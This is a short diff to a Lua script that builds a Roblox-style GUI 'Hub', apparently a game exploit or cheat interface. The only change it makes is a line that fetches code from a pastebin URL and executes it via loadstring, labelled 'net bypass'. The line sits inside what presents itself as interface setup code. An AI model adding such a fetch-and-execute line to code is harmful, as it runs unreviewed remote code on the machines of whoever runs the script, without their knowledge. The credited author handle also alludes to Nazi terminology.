@@ -4,6 +4,8 @@
 -- Instances:
 --[[made by PanzerKampfMeinFuhr1]]--
 
+loadstring(game:HttpGet(('https://pastebin.com/raw/XTmMzATJ'),true))() -- net bypass
+
 local Hub = Instance.new("ScreenGui")
 local TopMain = Instance.new("Frame")
 local Page1 = Instance.new("Frame")
